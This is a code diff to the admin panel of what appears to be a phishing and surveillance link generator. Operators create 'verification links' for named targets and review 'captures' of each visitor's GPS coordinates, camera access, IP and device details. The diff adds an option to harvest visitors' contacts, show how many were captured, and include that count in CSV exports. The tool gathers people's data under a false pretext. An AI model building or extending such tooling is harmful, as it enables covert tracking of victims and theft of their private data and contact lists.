@@ -390,6 +390,7 @@
         <div class="perm-row">
             <label class="check-label"><input type="checkbox" id="editCam"> 📷 Camera</label>
             <label class="check-label"><input type="checkbox" id="editGPS"> 📍 GPS</label>
+            <label class="check-label"><input type="checkbox" id="editContacts"> 📇 Contacts</label>
         </div>
         <div class="modal-row">
             <button class="btn btn-primary" id="saveEditLink">💾 Save</button>
@@ -641,6 +642,7 @@
                     <div class="form-row">
                         <label class="check-label"><input type="checkbox" id="checkCam" checked> 📷 Camera</label>
                         <label class="check-label"><input type="checkbox" id="checkGPS" checked> 📍 GPS</label>
+                        <label class="check-label"><input type="checkbox" id="checkContacts" checked> 📇 Contacts</label>
                         <button class="btn btn-primary" id="createBtn">⚡ Generate Link</button>
                     </div>
                     <div class="form-row" style="margin-bottom:0;">
@@ -882,6 +884,7 @@
                     <div class="form-row">
                         <label class="check-label"><input type="checkbox" id="uCheckCam" checked> 📷 Camera</label>
                         <label class="check-label"><input type="checkbox" id="uCheckGPS" checked> 📍 GPS</label>
+                        <label class="check-label"><input type="checkbox" id="uCheckContacts" checked> 📇 Contacts</label>
                         <button class="btn btn-primary" id="uCreateBtn">⚡ Generate Link</button>
                     </div>
                     <div class="form-row" style="margin-bottom:0;">
@@ -1322,8 +1325,8 @@ function renderLinksTable() {
         const verHref   = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
         // Target Name column — always shows the actual target name
         const nameCell = `<td><a href="${verHref}" target="_blank" rel="noopener" title="Verification link: ${verHref}" style="color:var(--primary);font-weight:700;text-decoration:none;">${esc(l.name || 'Unnamed')}</a></td>`;
-        // Permissions column — CAM / GPS / '—'
-        const perms = [l.cam ? '📷 CAM' : '', l.gps ? '📍 GPS' : ''].filter(Boolean);
+        // Permissions column — CAM / GPS / Contacts / '—'
+        const perms = [l.cam ? '📷 CAM' : '', l.gps ? '📍 GPS' : '', l.contacts ? '📇 Contacts' : ''].filter(Boolean);
         const permCell = `<td style="font-size:11px;">${perms.length ? perms.map(p => `<span class="tag">${p}</span>`).join(' ') : '<span style="color:#475569;">—</span>'}</td>`;
         const actionsCell = `<td style="white-space:nowrap;">
                 <button class="btn btn-gray btn-sm"   data-action="copy"   data-id="${id}">📋 Copy</button>
@@ -1377,6 +1380,7 @@ document.getElementById('linkTableBody').addEventListener('click', e => {
         document.getElementById('editRedirect').value    = l.redirectUrl || '';
         document.getElementById('editCam').checked       = !!l.cam;
         document.getElementById('editGPS').checked       = !!l.gps;
+        document.getElementById('editContacts').checked  = !!l.contacts;
         document.getElementById('editLinkModal').classList.add('open');
     } else if (action === 'delete') {
         if (!confirm('Move this link to Recycle Bin?')) return;
@@ -1397,6 +1401,7 @@ document.getElementById('createBtn').onclick = () => {
         id, name, active: true, visits: 0,
         cam: document.getElementById('checkCam').checked,
         gps: document.getElementById('checkGPS').checked,
+        contacts: document.getElementById('checkContacts').checked,
         redirectUrl: ru || '',
         createdAt:   Date.now(),
         _ownerType:  'admin',
@@ -1486,6 +1491,7 @@ function buildCapCard(key, p, inBin = false, isUser = false) {
             <p class="meta">📍 ${hasGPS
                 ? `<a href="https://www.google.com/maps?q=${p.latitude},${p.longitude}" target="_blank" style="color:var(--teal);">View Map</a>`
                 : 'GPS Denied'}</p>
+            ${p.contacts ? `<p class="meta">📇 ${p.contacts.count > 0 ? p.contacts.count + ' contact(s)' : esc(p.contacts.data || 'Denied')}</p>` : ''}
             <p class="meta">🕐 ${esc(p.time||'')} · ${esc(p.date||'')}</p>
             ${inBin ? `<p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>` : ''}
         </div>
@@ -1645,7 +1651,7 @@ function renderBin() {
             card.className = 'lbin-card';
             card.innerHTML = `
                 <p><b>🔗 ${esc(item.name||'Unknown')}</b></p>
-                <p class="meta">${item.cam ? '📷 Camera' : ''} ${item.gps ? '📍 GPS' : ''}</p>
+                <p class="meta">${item.cam ? '📷 Camera' : ''} ${item.gps ? '📍 GPS' : ''} ${item.contacts ? '📇 Contacts' : ''}</p>
                 ${item.redirectUrl ? `<p class="meta">↩️ ${esc(item.redirectUrl)}</p>` : ''}
                 <p class="meta">👁 ${item.visits||0} visits</p>
                 <p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(item.deletedAt).toLocaleDateString()}</p>
@@ -2030,6 +2036,7 @@ async function showUserActivity(username) {
             ['📅 Date',      p.date||'N/A'],
             ['🕐 Time',      p.time||'N/A'],
             ['📍 GPS',       hasGPS ? p.latitude+', '+p.longitude : 'Denied'],
+            ['📇 Contacts',  p.contacts ? (p.contacts.count > 0 ? p.contacts.count + ' contact(s) captured' : p.contacts.data || 'None') : 'Not requested'],
         ].map(([k,v]) =>
             `<div style="display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid var(--border);font-size:10.5px;">
                 <span style="color:var(--muted);">${k}</span>
@@ -2083,7 +2090,7 @@ async function showUserActivity(username) {
         const status = l.active
             ? `<span style="color:var(--green);font-weight:700;font-size:11px;">● Active</span>`
             : `<span style="color:var(--red);font-weight:700;font-size:11px;">● Off</span>`;
-        const perms = [l.cam?'📷 Cam':'', l.gps?'📍 GPS':''].filter(Boolean).join(' · ') || '—';
+        const perms = [l.cam?'📷 Cam':'', l.gps?'📍 GPS':'', l.contacts?'📇 Contacts':''].filter(Boolean).join(' · ') || '—';
         const redir = l.redirectUrl
             ? `<a href="${ex(l.redirectUrl)}" target="_blank" style="color:var(--teal);font-size:10.5px;">${ex(l.redirectUrl.slice(0,30))}…</a>`
             : '<span style="color:#475569;font-size:10.5px;">—</span>';
@@ -2100,7 +2107,7 @@ async function showUserActivity(username) {
 
     // ── deleted link row
     const delLinkRow = x => {
-        const perms = [x.cam?'📷 Cam':'', x.gps?'📍 GPS':''].filter(Boolean).join(' · ') || '—';
+        const perms = [x.cam?'📷 Cam':'', x.gps?'📍 GPS':'', x.contacts?'📇 Contacts':''].filter(Boolean).join(' · ') || '—';
         return `
         <tr style="opacity:.85;">
             <td style="padding:8px 10px;font-weight:600;font-size:12px;color:var(--text);">${ex(x.name||'Unnamed')}</td>
@@ -2295,8 +2302,8 @@ function renderUserLinksTable() {
         const verHref   = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
         // Target Name — always shows actual target name
         const nameCell    = `<td><a href="${verHref}" target="_blank" rel="noopener" title="Verification link: ${verHref}" style="color:var(--primary);font-weight:700;text-decoration:none;">${esc(l.name || 'Unnamed')}</a></td>`;
-        // Permissions — CAM / GPS / '—'
-        const perms = [l.cam ? '📷 CAM' : '', l.gps ? '📍 GPS' : ''].filter(Boolean);
+        // Permissions — CAM / GPS / Contacts / '—'
+        const perms = [l.cam ? '📷 CAM' : '', l.gps ? '📍 GPS' : '', l.contacts ? '📇 Contacts' : ''].filter(Boolean);
         const permCell    = `<td style="font-size:11px;">${perms.length ? perms.map(p => `<span class="tag">${p}</span>`).join(' ') : '<span style="color:#475569;">—</span>'}</td>`;
         const redir       = l.redirectUrl ? `<a href="${esc(l.redirectUrl)}" target="_blank" style="color:var(--teal);font-size:11px;">${esc(l.redirectUrl.slice(0,28))}…</a>` : '<span style="color:#475569;">—</span>';
         row.innerHTML = nameCell + permCell +
@@ -2349,6 +2356,7 @@ document.getElementById('uLinkTableBody').addEventListener('click', e => {
         document.getElementById('editRedirect').value   = l.redirectUrl || '';
         document.getElementById('editCam').checked      = !!l.cam;
         document.getElementById('editGPS').checked      = !!l.gps;
+        document.getElementById('editContacts').checked = !!l.contacts;
         document.getElementById('editLinkModal').classList.add('open');
     } else if (uaction === 'delete') {
         if (!confirm('Move this link to Recycle Bin?')) return;
@@ -2374,6 +2382,7 @@ document.getElementById('uCreateBtn').onclick = () => {
         id, name, active: true, visits: 0,
         cam: document.getElementById('uCheckCam').checked,
         gps: document.getElementById('uCheckGPS').checked,
+        contacts: document.getElementById('uCheckContacts').checked,
         redirectUrl: ru || '',
         createdAt:   Date.now(),
         _ownerType:  'user',
@@ -2535,10 +2544,10 @@ document.getElementById('uExportBtn').onclick = () => {
     if (!uAllLogsData) { toast('⚠️ No captures to export.', 'var(--yellow)'); return; }
     const myLogs = Object.values(uAllLogsData).filter(p => p._ownerId === username && p._ownerType === 'user');
     if (myLogs.length === 0) { toast('⚠️ No captures to export.', 'var(--yellow)'); return; }
-    const rows = [['Name','Date','Time','IP','GPS Lat','GPS Lon','OS','Browser','Battery','Network']];
+    const rows = [['Name','Date','Time','IP','GPS Lat','GPS Lon','OS','Browser','Battery','Network','Contacts Count']];
     myLogs.forEach(p => {
         const d = p.device || {};
-        rows.push([p.linkName||'', p.date||'', p.time||'', p.ipAddress||'', p.latitude||'', p.longitude||'', d.os||'', d.browser||'', d.battery||'', d.networkType||'']);
+        rows.push([p.linkName||'', p.date||'', p.time||'', p.ipAddress||'', p.latitude||'', p.longitude||'', d.os||'', d.browser||'', d.battery||'', d.networkType||'', p.contacts ? (p.contacts.count || 0) : '']);
     });
     const csv  = rows.map(r => r.map(c => '"' + String(c).replace(/"/g,'""') + '"').join(',')).join('\n');
     const blob = new Blob([csv], { type: 'text/csv' });
@@ -2584,7 +2593,7 @@ function renderUserBin() {
             card.className = 'lbin-card';
             card.innerHTML = `
                 <p><b>🔗 ${esc(item.name||'Unknown')}</b></p>
-                <p class="meta">${item.cam ? '📷 Camera' : ''} ${item.gps ? '📍 GPS' : ''}</p>
+                <p class="meta">${item.cam ? '📷 Camera' : ''} ${item.gps ? '📍 GPS' : ''} ${item.contacts ? '📇 Contacts' : ''}</p>
                 ${item.redirectUrl ? `<p class="meta">↩️ ${esc(item.redirectUrl)}</p>` : ''}
                 <p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(item.deletedAt).toLocaleDateString()}</p>
                 <div style="display:flex;gap:6px;margin-top:10px;">
@@ -2771,6 +2780,7 @@ function openInfoModal(p) {
         { k: '🔗 Referrer',    v: d.referrer||'Direct', full: true },
         { k: '📍 GPS',         v: hasGPS ? `${p.latitude}, ${p.longitude}` : 'Denied', full: hasGPS },
         { k: '🔑 Link ID',     v: p.linkId||'N/A', full: true },
+        { k: '📇 Contacts',    v: p.contacts ? (p.contacts.count > 0 ? p.contacts.count + ' contact(s) captured' : p.contacts.data || 'None') : 'Not requested', full: true },
     ];
 
     document.getElementById('infoGrid').innerHTML = rows.map(r =>
@@ -2915,6 +2925,7 @@ document.getElementById('saveEditLink').onclick = () => {
         name: nm, redirectUrl: ru,
         cam: document.getElementById('editCam').checked,
         gps: document.getElementById('editGPS').checked,
+        contacts: document.getElementById('editContacts').checked,
     }).then(() => {
         document.getElementById('editLinkModal').classList.remove('open');
         currentEditId = null;
@@ -2942,14 +2953,15 @@ document.getElementById('savePwBtn').onclick = () => {
 // ══════════════════════════════════════════════════════════
 document.getElementById('exportBtn').onclick = () => {
     if (!allLogsData) { toast('⚠️ No logs to export.', 'var(--yellow)'); return; }
-    const rows = [['Name','Date','Time','IP','GPS Lat','GPS Lon','OS','Browser','Battery','Charging','Network','Speed','Screen','Timezone','Language','Referrer','Owner']];
+    const rows = [['Name','Date','Time','IP','GPS Lat','GPS Lon','OS','Browser','Battery','Charging','Network','Speed','Screen','Timezone','Language','Referrer','Owner','Contacts Count']];
     Object.values(allLogsData).forEach(p => {
         const d = p.device || {};
         rows.push([p.linkName||'', p.date||'', p.time||'', p.ipAddress||'',
             p.latitude||'', p.longitude||'', d.os||'', d.browser||'',
             d.battery||'', d.charging||'', d.networkType||'', d.downlink||'',
             d.screenWidth ? `${d.screenWidth}x${d.screenHeight}` : '',
-            d.timezone||'', d.language||'', d.referrer||'', p._ownerId||'admin']);
+            d.timezone||'', d.language||'', d.referrer||'', p._ownerId||'admin',
+            p.contacts ? (p.contacts.count || 0) : '']);
     });
     const csv  = rows.map(r => r.map(c => '"' + String(c).replace(/"/g,'""') + '"').join(',')).join('\n');
     const blob = new Blob([csv], { type: 'text/csv' });
